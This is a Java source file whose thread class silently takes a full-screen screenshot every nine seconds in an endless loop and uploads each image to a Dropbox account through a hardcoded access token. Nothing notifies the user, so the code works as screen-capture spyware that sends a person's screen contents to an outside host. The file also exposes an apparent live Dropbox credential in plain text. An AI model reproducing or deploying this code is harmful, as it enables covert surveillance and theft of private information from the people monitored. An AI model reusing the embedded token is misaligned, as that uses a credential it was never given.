import com.dropbox.core.DbxException;
import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

    public class MyThread extends Thread {
    public DbxClientV2 client;
    DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
    Date date = new Date();
    String MyTime;
    BufferedImage image = null;

        @Override
    public void run()
    {

        for (;;)
        {

            try {
                 image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
            }
            catch (AWTException e) {
                e.printStackTrace();
            }

            ByteArrayOutputStream os = new ByteArrayOutputStream();
            try {
                ImageIO.write(image, "png", os);
                }
            catch (IOException e) {
                e.printStackTrace();
            }

            InputStream is = new ByteArrayInputStream(os.toByteArray());
            MyTime = dateFormat.format(date) + ".png";
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(Calendar.getInstance().getTime());
            //String fileName = timeStamp + ".png";
            String ACCESS_TOKEN =  "Bi-AHJt9ZuAAAAAAAAAAHIh131qMlQBt6yW_xpdQ2uEXgn6OsWt-SIrMR9XlYNNT";
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
            try {
                  FileMetadata metadata = client.files().uploadBuilder("/"+timeStamp+".png").uploadAndFinish(is);
                }

            catch (DbxException | IOException e) {
                e.printStackTrace();
            }

            try {
                sleep(9000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

        }
    }
}
